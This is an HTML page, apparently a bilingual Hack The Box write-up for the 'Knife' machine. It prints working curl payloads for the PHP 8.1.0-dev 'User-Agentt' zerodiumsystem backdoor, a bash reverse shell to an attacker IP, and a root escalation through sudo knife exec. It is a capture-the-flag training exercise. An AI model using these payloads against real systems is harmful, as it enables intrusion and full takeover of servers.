@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>knife | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">knife</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a web server with PHP version 8.1.0-dev, which contained a deliberate backdoor that was introduced by attackers. This backdoor allowed remote code execution by sending a specially crafted HTTP header <code>User-Agentt</code> (note the double 't') containing the command to execute wrapped in the format <code>zerodiumsystem('command');</code>.</p>
+                    <p>By exploiting this backdoor, I obtained initial access as the user <code>james</code>. The privilege escalation was straightforward - the user had sudo permissions to execute <code>/usr/bin/knife</code> without a password. Knife is a command-line tool from Chef Workstation that runs on Ruby and has the ability to execute arbitrary Ruby code.</p>
+                    <p>Using the <code>knife exec -E</code> command with the Ruby <code>system()</code> function, I was able to execute commands as root and obtain a root shell.</p>
+                    <p><strong>Technologies/Exploits:</strong> PHP 8.1.0-dev backdoor remote code execution, Chef Knife privilege escalation via sudo misconfiguration and Ruby code execution.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I start with an nmap scan to identify open ports and running services on the target machine:</p>
+                <p><img src="./media/image1.png" alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 80 with Apache 2.4.41 running PHP 8.1.0-dev" /></p>
+
+                <p>The scan reveals two open ports: SSH on port 22 and HTTP on port 80. The web server is running Apache 2.4.41 on Ubuntu, and most importantly, it's running PHP version <strong>8.1.0-dev</strong>, which immediately catches my attention due to the development tag.</p>
+
+                <h2>Web Application Enumeration</h2>
+                <p>Running <code>whatweb</code> provides additional details about the web application:</p>
+                <pre><code class="language-bash">whatweb http://10.129.14.34</code></pre>
+
+                <p>The output confirms:</p>
+                <pre><code class="language-plaintext">http://10.129.14.34 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.14.34], 
+PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]</code></pre>
+
+                <p>The web application appears to be related to healthcare/medical services. I perform directory enumeration to discover additional resources, but only find standard files like <code>.htaccess</code>, <code>.htpasswd</code>, and the main <code>index.php</code> page. Nothing particularly interesting emerges from the enumeration itself.</p>
+
+                <h2>Vulnerability Research - PHP 8.1.0-dev Backdoor</h2>
+                <p>The <code>-dev</code> tag in the PHP version immediately raises suspicion. Development versions are not typically deployed in production environments. After searching online, I discover a critical vulnerability related to this specific version.</p>
+
+                <p>I find detailed information in this GitHub repository: <a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/README.md">https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/README.md</a></p>
+
+                <h3>Understanding the Backdoor</h3>
+                <p>It turns out that this PHP version was released with an intentionally embedded backdoor. The backdoor was quickly discovered and removed, but not before it was distributed. For more technical details about how the backdoor was introduced, you can read this analysis: <a href="https://amsghimire.medium.com/php-8-1-0-dev-backdoor-cb224e7f5914">https://amsghimire.medium.com/php-8-1-0-dev-backdoor-cb224e7f5914</a></p>
+
+                <p>The exploitation mechanism is remarkably simple. The backdoor allows remote code execution by sending a specially crafted HTTP header:</p>
+                <pre><code class="language-plaintext">User-Agentt: zerodiumsystem('command');</code></pre>
+
+                <p>Note that the header name is <code>User-Agentt</code> with a double 't', not the standard <code>User-Agent</code> header. The command to execute is wrapped in the <code>zerodiumsystem()</code> function.</p>
+
+                <h2>Initial Access - Exploiting the PHP Backdoor</h2>
+                <p>I test the backdoor by sending a simple command to list the root directory:</p>
+                <pre><code class="language-bash">curl -X GET "http://10.129.14.34/index.php" -H "User-Agentt: zerodiumsystem('ls');"</code></pre>
+
+                <p>The output confirms that the backdoor is active and I have code execution:</p>
+                <pre><code class="language-plaintext">bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+<!DOCTYPE html>
+<html lang="en" >
+(...) Rest of HTML</code></pre>
+
+                <p>The command executed successfully, displaying the directory listing before the HTML content of the page. Now that I've confirmed remote code execution, I can proceed to gain a proper shell.</p>
+
+                <h3>Establishing a Reverse Shell</h3>
+                <p>I set up a netcat listener on my attacking machine:</p>
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+
+                <p>Then I send a reverse shell payload through the backdoor:</p>
+                <pre><code class="language-bash">curl -X GET "http://10.129.14.34/index.php" -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/10.10.16.6/443 0>&1\"');"</code></pre>
+
+                <p>I successfully receive the reverse shell connection and gain access as the <code>james</code> user. I can now retrieve the user flag from <code>/home/james/user.txt</code>.</p>
+
+                <h2>Privilege Escalation - Knife Sudo Misconfiguration</h2>
+                <p>After stabilizing the shell, I check what sudo privileges the <code>james</code> user has:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>The output reveals an important finding:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for james on knife:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife</code></pre>
+
+                <p>The user can execute <code>/usr/bin/knife</code> as root without providing a password. Let me investigate what this binary actually is:</p>
+                <pre><code class="language-bash">file /usr/bin/knife</code></pre>
+
+                <p>The output shows it's a symbolic link:</p>
+                <pre><code class="language-plaintext">/usr/bin/knife: symbolic link to /opt/chef-workstation/bin/knife</code></pre>
+
+                <h3>Understanding Knife</h3>
+                <p>I examine the actual knife binary to understand what it does:</p>
+                <pre><code class="language-bash">cat /opt/chef-workstation/bin/knife</code></pre>
+
+                <p>The file reveals it's a Ruby script:</p>
+                <pre><code class="language-ruby">#!/opt/chef-workstation/embedded/bin/ruby --disable-gems
+#--APP_BUNDLER_BINSTUB_FORMAT_VERSION=1--
+require "rubygems"
+(...)</code></pre>
+
+                <p>Knife is a command-line tool from Chef Workstation, written in Ruby. I verify the Ruby version:</p>
+                <pre><code class="language-bash">/opt/chef-workstation/embedded/bin/ruby --version</code></pre>
+
+                <p>Output:</p>
+                <pre><code class="language-plaintext">ruby 2.7.2p137 (2020-10-01 revision 5445e04352) [x86_64-linux]</code></pre>
+
+                <h3>GTFOBins Research</h3>
+                <p>I search GTFOBins for privilege escalation techniques involving knife: <a href="https://gtfobins.org/gtfobins/knife/#inherit">https://gtfobins.org/gtfobins/knife/#inherit</a></p>
+
+                <p>Since knife is essentially a Ruby script, it can execute arbitrary Ruby code. GTFOBins shows that I can use the <code>exec</code> command to run Ruby code, which can then execute system commands.</p>
+
+                <h3>Testing Command Execution</h3>
+                <p>I test if I can execute commands as root using knife's ability to execute Ruby code with the <code>system()</code> function:</p>
+                <pre><code class="language-bash">sudo knife exec -E 'system("id")'</code></pre>
+
+                <p>The command successfully executes as root:</p>
+                <pre><code class="language-plaintext">uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+                <h3>Gaining Root Access</h3>
+                <p>Now that I've confirmed I can execute commands as root, I spawn a root shell:</p>
+                <pre><code class="language-bash">sudo knife exec -E 'system("/bin/bash")'</code></pre>
+
+                <p>This grants me a root shell:</p>
+                <pre><code class="language-bash">root@knife:/opt/chef-workstation# whoami
+root</code></pre>
+
+                <p>I now have full root access to the system and can retrieve the root flag from <code>/root/root.txt</code>, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba un servidor web con PHP versión 8.1.0-dev, que contenía una puerta trasera deliberada introducida por atacantes. Esta backdoor permitía la ejecución remota de código enviando una cabecera HTTP especialmente diseñada <code>User-Agentt</code> (nótese la doble 't') conteniendo el comando a ejecutar envuelto en el formato <code>zerodiumsystem('comando');</code>.</p>
+                    <p>Explotando esta puerta trasera, obtuve acceso inicial como el usuario <code>james</code>. La escalada de privilegios fue directa - el usuario tenía permisos sudo para ejecutar <code>/usr/bin/knife</code> sin contraseña. Knife es una herramienta de línea de comandos de Chef Workstation que se ejecuta sobre Ruby y tiene la capacidad de ejecutar código Ruby arbitrario.</p>
+                    <p>Usando el comando <code>knife exec -E</code> con la función <code>system()</code> de Ruby, pude ejecutar comandos como root y obtener una shell root.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> Backdoor de PHP 8.1.0-dev para ejecución remota de código, escalada de privilegios en Chef Knife mediante mala configuración de sudo y ejecución de código Ruby.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución en la máquina objetivo:</p>
+                <p><img src="./media/image1.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 80 con Apache 2.4.41 ejecutando PHP 8.1.0-dev" /></p>
+
+                <p>El escaneo revela dos puertos abiertos: SSH en el puerto 22 y HTTP en el puerto 80. El servidor web ejecuta Apache 2.4.41 sobre Ubuntu, y lo más importante, está ejecutando PHP versión <strong>8.1.0-dev</strong>, lo cual inmediatamente llama mi atención debido a la etiqueta de desarrollo.</p>
+
+                <h2>Enumeración de la Aplicación Web</h2>
+                <p>Ejecutando <code>whatweb</code> obtengo detalles adicionales sobre la aplicación web:</p>
+                <pre><code class="language-bash">whatweb http://10.129.14.34</code></pre>
+
+                <p>La salida confirma:</p>
+                <pre><code class="language-plaintext">http://10.129.14.34 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.14.34], 
+PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]</code></pre>
+
+                <p>La aplicación web parece estar relacionada con servicios de salud/medicina. Realizo una enumeración de directorios para descubrir recursos adicionales, pero solo encuentro archivos estándar como <code>.htaccess</code>, <code>.htpasswd</code> y la página principal <code>index.php</code>. Nada particularmente interesante surge de la enumeración en sí.</p>
+
+                <h2>Investigación de Vulnerabilidades - Backdoor de PHP 8.1.0-dev</h2>
+                <p>La etiqueta <code>-dev</code> en la versión de PHP inmediatamente genera sospechas. Las versiones de desarrollo normalmente no se implementan en entornos de producción. Tras buscar en línea, descubro una vulnerabilidad crítica relacionada con esta versión específica.</p>
+
+                <p>Encuentro información detallada en este repositorio de GitHub: <a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/README.md">https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/README.md</a></p>
+
+                <h3>Entendiendo la Puerta Trasera</h3>
+                <p>Resulta que esta versión de PHP fue lanzada con una puerta trasera intencionalmente incorporada. La backdoor fue rápidamente descubierta y eliminada, pero no antes de ser distribuida. Para más detalles técnicos sobre cómo se introdujo la puerta trasera, podéis leer este análisis: <a href="https://amsghimire.medium.com/php-8-1-0-dev-backdoor-cb224e7f5914">https://amsghimire.medium.com/php-8-1-0-dev-backdoor-cb224e7f5914</a></p>
+
+                <p>El mecanismo de explotación es notablemente simple. La puerta trasera permite la ejecución remota de código enviando una cabecera HTTP especialmente diseñada:</p>
+                <pre><code class="language-plaintext">User-Agentt: zerodiumsystem('comando');</code></pre>
+
+                <p>Notad que el nombre de la cabecera es <code>User-Agentt</code> con doble 't', no la cabecera estándar <code>User-Agent</code>. El comando a ejecutar se envuelve en la función <code>zerodiumsystem()</code>.</p>
+
+                <h2>Acceso Inicial - Explotando la Backdoor de PHP</h2>
+                <p>Pruebo la puerta trasera enviando un comando simple para listar el directorio raíz:</p>
+                <pre><code class="language-bash">curl -X GET "http://10.129.14.34/index.php" -H "User-Agentt: zerodiumsystem('ls');"</code></pre>
+
+                <p>La salida confirma que la puerta trasera está activa y tengo ejecución de código:</p>
+                <pre><code class="language-plaintext">bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+<!DOCTYPE html>
+<html lang="en" >
+(...) Resto del HTML</code></pre>
+
+                <p>El comando se ejecutó exitosamente, mostrando el listado del directorio antes del contenido HTML de la página. Ahora que he confirmado la ejecución remota de código, puedo proceder a obtener una shell apropiada.</p>
+
+                <h3>Estableciendo una Reverse Shell</h3>
+                <p>Configuro un listener de netcat en mi máquina atacante:</p>
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+
+                <p>Luego envío un payload de reverse shell a través de la puerta trasera:</p>
+                <pre><code class="language-bash">curl -X GET "http://10.129.14.34/index.php" -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/10.10.16.6/443 0>&1\"');"</code></pre>
+
+                <p>Recibo exitosamente la conexión de reverse shell y obtengo acceso como el usuario <code>james</code>. Ahora puedo recuperar la flag de usuario desde <code>/home/james/user.txt</code>.</p>
+
+                <h2>Escalada de Privilegios - Mala Configuración de Sudo en Knife</h2>
+                <p>Después de estabilizar la shell, compruebo qué privilegios sudo tiene el usuario <code>james</code>:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>La salida revela un hallazgo importante:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for james on knife:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife</code></pre>
+
+                <p>El usuario puede ejecutar <code>/usr/bin/knife</code> como root sin proporcionar contraseña. Investigo qué es realmente este binario:</p>
+                <pre><code class="language-bash">file /usr/bin/knife</code></pre>
+
+                <p>La salida muestra que es un enlace simbólico:</p>
+                <pre><code class="language-plaintext">/usr/bin/knife: symbolic link to /opt/chef-workstation/bin/knife</code></pre>
+
+                <h3>Entendiendo Knife</h3>
+                <p>Examino el binario real de knife para entender qué hace:</p>
+                <pre><code class="language-bash">cat /opt/chef-workstation/bin/knife</code></pre>
+
+                <p>El archivo revela que es un script de Ruby:</p>
+                <pre><code class="language-ruby">#!/opt/chef-workstation/embedded/bin/ruby --disable-gems
+#--APP_BUNDLER_BINSTUB_FORMAT_VERSION=1--
+require "rubygems"
+(...)</code></pre>
+
+                <p>Knife es una herramienta de línea de comandos de Chef Workstation, escrita en Ruby. Verifico la versión de Ruby:</p>
+                <pre><code class="language-bash">/opt/chef-workstation/embedded/bin/ruby --version</code></pre>
+
+                <p>Salida:</p>
+                <pre><code class="language-plaintext">ruby 2.7.2p137 (2020-10-01 revision 5445e04352) [x86_64-linux]</code></pre>
+
+                <h3>Investigación en GTFOBins</h3>
+                <p>Busco en GTFOBins técnicas de escalada de privilegios que involucren knife: <a href="https://gtfobins.org/gtfobins/knife/#inherit">https://gtfobins.org/gtfobins/knife/#inherit</a></p>
+
+                <p>Como knife es esencialmente un script de Ruby, puede ejecutar código Ruby arbitrario. GTFOBins muestra que puedo usar el comando <code>exec</code> para ejecutar código Ruby, que luego puede ejecutar comandos del sistema.</p>
+
+                <h3>Probando la Ejecución de Comandos</h3>
+                <p>Pruebo si puedo ejecutar comandos como root usando la capacidad de knife para ejecutar código Ruby con la función <code>system()</code>:</p>
+                <pre><code class="language-bash">sudo knife exec -E 'system("id")'</code></pre>
+
+                <p>El comando se ejecuta exitosamente como root:</p>
+                <pre><code class="language-plaintext">uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+                <h3>Obteniendo Acceso Root</h3>
+                <p>Ahora que he confirmado que puedo ejecutar comandos como root, genero una shell root:</p>
+                <pre><code class="language-bash">sudo knife exec -E 'system("/bin/bash")'</code></pre>
+
+                <p>Esto me otorga una shell root:</p>
+                <pre><code class="language-bash">root@knife:/opt/chef-workstation# whoami
+root</code></pre>
+
+                <p>Ahora tengo acceso root completo al sistema y puedo recuperar la flag root desde <code>/root/root.txt</code>, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
